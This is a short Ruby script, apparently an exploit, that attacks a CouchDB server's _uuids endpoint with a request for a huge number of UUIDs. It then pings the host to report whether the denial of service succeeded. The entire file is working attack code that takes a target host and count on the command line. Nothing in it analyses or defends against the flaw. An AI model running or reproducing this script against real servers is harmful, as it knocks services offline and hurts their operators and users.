#!/bin/env ruby
require "net/http"
require "net/ping"
require "json"

def check_dos(uri)
  result = Net::Ping::HTTP.new(uri)
  if result.ping
    print("Host still alive. Maybe increase _uuids max count:\n\n")
    print(" - ruby exploit.rb HOST MAXCOUNT\n\n")
  else
    print("Host seem down. Attack successfull (or your internet connection is down :O).\n\n")
  end
end

def do_dos(uri)
  print("\nStarting _uuids DoS on #{uri}\n\n")

  attack = JSON.parse(Net::HTTP.get(URI.parse(uri)))

  if attack["error"] && attack["reason"]
    error = attack["error"]
    reason = attack["reason"]

    print("Attack failed: #{error} - #{reason}.\n\n")
    print("Host not seems to be exploitable.\n\n")
  else
    if attack["uuids"]
      cuuids = attack["uuids"].length
      print("Attack succeeded. #{cuuids} uuids created.\n\n")
      check_dos(uri)
    end
  end
end

if ARGV.length < 1 || ARGV.length > 2
  print("\nMust be at least: \n")
  print(" - ruby exploit.rb HOST\n")
  print("e.g: ruby exploit.rb http://localhost:5984\n\n")
else
  host=ARGV[0] #"10.211.55.8" Host Header or Forwaded For Header
  mcount=ARGV[1] || 1001
  uri = "#{host}/_uuids?count=#{mcount}"
  do_dos(uri)
end